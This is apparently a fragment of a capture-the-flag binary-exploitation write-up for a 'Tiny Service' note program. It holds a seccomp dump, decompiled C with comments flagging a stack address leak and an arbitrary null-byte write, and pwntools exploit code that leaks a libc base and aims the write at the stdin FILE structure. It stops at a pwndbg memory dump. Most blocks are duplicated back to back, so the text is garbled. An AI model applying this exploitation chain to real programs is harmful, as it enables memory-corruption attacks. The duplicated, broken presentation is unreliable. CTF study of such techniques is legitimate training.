
```text
0010: 0x15 0x02 0x00 0x0000003c if (A == exit) goto 0013
0011: 0x15 0x01 0x00 0x000000e7 if (A == exit_group) goto 0013
0012: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0014
0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0014: 0x06 0x00 0x00 0x00000000 return KILL
int
__libc_open (const char *file, int oflag, ...)
{
int mode = 0;
if (__OPEN_NEEDS_MODE (oflag))
{
va_list arg;
va_start (arg, oflag);
mode = va_arg (arg, int);
va_end (arg);
}
return SYSCALL_CANCEL (openat, AT_FDCWD, file, oflag, mode);
}
libc_hidden_def (__libc_open)
int
__libc_open (const char *file, int oflag, ...)
{
int mode = 0;
if (__OPEN_NEEDS_MODE (oflag))
{
va_list arg;
va_start (arg, oflag);
mode = va_arg (arg, int);
va_end (arg);
}
return SYSCALL_CANCEL (openat, AT_FDCWD, file, oflag, mode);
}
libc_hidden_def (__libc_open)
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
char s[40]; // [rsp+0h] [rbp-68h] BYREF
unsigned __int64 v5; // [rsp+28h] [rbp-40h]
v5 = __readfsqword(0x28u);
init(a1, a2, a3);
set_sandbox();
sub_1640(); // 可泄露地址
while ( 2 )
{
while ( 1 )
{
puts("");
puts("1) Create note");
puts("2) Edit note");
puts("3) View note");
puts("4) Delete note");
puts("6) Exit");
__printf_chk(2, "Choice: ");
if ( fgets(s, 32, stdin) ) // fgets
break;
LABEL_9:
puts("bad choice");
}
switch ( (unsigned int)__isoc23_strtol(s, 0, 10) )
{
case 1u:
create(); // 任意地址写入00
continue;
case 2u:
sub_1930(); // 未实现
continue;
case 3u:
__printf_chk(2, "Index: ");
sub_1710(); // 未实现
continue;
case 4u:
sub_1A50(); // 不可用
continue;
case 6u:
puts("bye");
return 0;
default:
goto LABEL_9;
}
}
}
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
char s[40]; // [rsp+0h] [rbp-68h] BYREF
unsigned __int64 v5; // [rsp+28h] [rbp-40h]
v5 = __readfsqword(0x28u);
init(a1, a2, a3);
set_sandbox();
sub_1640(); // 可泄露地址
while ( 2 )
{
while ( 1 )
{
puts("");
puts("1) Create note");
puts("2) Edit note");
puts("3) View note");
puts("4) Delete note");
puts("6) Exit");
__printf_chk(2, "Choice: ");
if ( fgets(s, 32, stdin) ) // fgets
break;
LABEL_9:
puts("bad choice");
}
switch ( (unsigned int)__isoc23_strtol(s, 0, 10) )
{
case 1u:
create(); // 任意地址写入00
continue;
case 2u:
sub_1930(); // 未实现
continue;
case 3u:
__printf_chk(2, "Index: ");
sub_1710(); // 未实现
continue;
case 4u:
sub_1A50(); // 不可用
continue;
case 6u:
puts("bye");
return 0;
default:
goto LABEL_9;
}
}
}
int init()
{
int result; // eax
setvbuf(stdin, 0, 2, 0);
result = setvbuf(stdout, 0, 2, 0);
size = 0;
ptr = 0;
return result;
}
int init()
{
int result; // eax
setvbuf(stdin, 0, 2, 0);
result = setvbuf(stdout, 0, 2, 0);
size = 0;
ptr = 0;
return result;
}
unsigned __int64 sub_1640()
{
char buf[88]; // [rsp+0h] [rbp-68h] BYREF
unsigned __int64 v2; // [rsp+58h] [rbp-10h]
v2 = __readfsqword(0x28u);
puts("=== Tiny Service ===");
__printf_chk(2, "Please input your token: ");
read(0, buf, 0x50u);
__printf_chk(2, "Your token is %s.\n", buf);
return v2 - __readfsqword(0x28u);
}
unsigned __int64 sub_1640()
{
char buf[88]; // [rsp+0h] [rbp-68h] BYREF
unsigned __int64 v2; // [rsp+58h] [rbp-10h]
v2 = __readfsqword(0x28u);
puts("=== Tiny Service ===");
__printf_chk(2, "Please input your token: ");
read(0, buf, 0x50u);
__printf_chk(2, "Your token is %s.\n", buf);
return v2 - __readfsqword(0x28u);
}
int create()
{
__int64 v0; // rax
size_t size_1; // rbx
void *ptr; // rax
size_t size; // [rsp+0h] [rbp-18h] BYREF
unsigned __int64 v5; // [rsp+8h] [rbp-10h]
v5 = __readfsqword(0x28u);
if ( ptr || dword_4040 )
{
LODWORD(v0) = puts("No free slots.");
}
else
{
__printf_chk(2, "Size: ");
__isoc23_scanf("%zu", &size); // 读取size
getc(stdin);
size_1 = size;
ptr = malloc(size); // 申请内存
::size = size_1;
ptr = ptr;
__printf_chk(2, "Content: ");
read(0, ptr, size); // 读取数据
*((char *)ptr + size - 1) = 0; // 写入00
__printf_chk(2, "Created note %d\n", 0);
dword_4040 = 1;
return v5 - __readfsqword(0x28u);
}
return v0;
}
int create()
{
__int64 v0; // rax
size_t size_1; // rbx
void *ptr; // rax
size_t size; // [rsp+0h] [rbp-18h] BYREF
unsigned __int64 v5; // [rsp+8h] [rbp-10h]
v5 = __readfsqword(0x28u);
if ( ptr || dword_4040 )
{
LODWORD(v0) = puts("No free slots.");
}
else
{
__printf_chk(2, "Size: ");
__isoc23_scanf("%zu", &size); // 读取size
getc(stdin);
size_1 = size;
ptr = malloc(size); // 申请内存
::size = size_1;
ptr = ptr;
__printf_chk(2, "Content: ");
read(0, ptr, size); // 读取数据
*((char *)ptr + size - 1) = 0; // 写入00
__printf_chk(2, "Created note %d\n", 0);
dword_4040 = 1;
return v5 - __readfsqword(0x28u);
}
return v0;
}
int sub_1A50()
{
char s[40]; // [rsp+0h] [rbp-38h] BYREF
unsigned __int64 v2; // [rsp+28h] [rbp-10h]
v2 = __readfsqword(0x28u);
__printf_chk(2, "Index: ");
if ( !fgets(s, 32, stdin) || dword_4040 | (unsigned int)__isoc23_strtol(s, 0, 10) )
return puts("invalid");
if ( !ptr )
return puts("already empty");
free(ptr);
ptr = 0;
size = 0;
return puts("Deleted (pointer left dangling).");
}
int sub_1A50()
{
char s[40]; // [rsp+0h] [rbp-38h] BYREF
unsigned __int64 v2; // [rsp+28h] [rbp-10h]
v2 = __readfsqword(0x28u);
__printf_chk(2, "Index: ");
if ( !fgets(s, 32, stdin) || dword_4040 | (unsigned int)__isoc23_strtol(s, 0, 10) )
return puts("invalid");
if ( !ptr )
return puts("already empty");
free(ptr);
ptr = 0;
size = 0;
return puts("Deleted (pointer left dangling).");
}
payload = cyclic(0x28)
sa(b"token: ",payload)
ru(cyclic(0x28))
leak = r(6).ljust(8,b"\x00")
leak = unpack(leak) - 126
success(f"leak: {hex(leak)}")
libc.address = leak - libc.sym.free
success(f"libc base: {hex(libc.address)}")
payload = cyclic(0x28)
sa(b"token: ",payload)
ru(cyclic(0x28))
leak = r(6).ljust(8,b"\x00")
leak = unpack(leak) - 126
success(f"leak: {hex(leak)}")
libc.address = leak - libc.sym.free
success(f"libc base: {hex(libc.address)}")
target = libc.address +0x203918
success(f"target: {hex(target)}")
sla(b"Choice: ",b"1")
sla(b"Size: ",str(target+1).encode())
sa(b": ",b"aaaa")
target = libc.address +0x203918
success(f"target: {hex(target)}")
sla(b"Choice: ",b"1")
sla(b"Size: ",str(target+1).encode())
sa(b": ",b"aaaa")
pwndbg> x/40xga &_IO_2_1_stdin_
0x7ffff7f908e0 <_IO_2_1_stdin_>: 0xfbad20ab      0x7ffff7f90900 <_IO_2_1_stdin_+32>
```
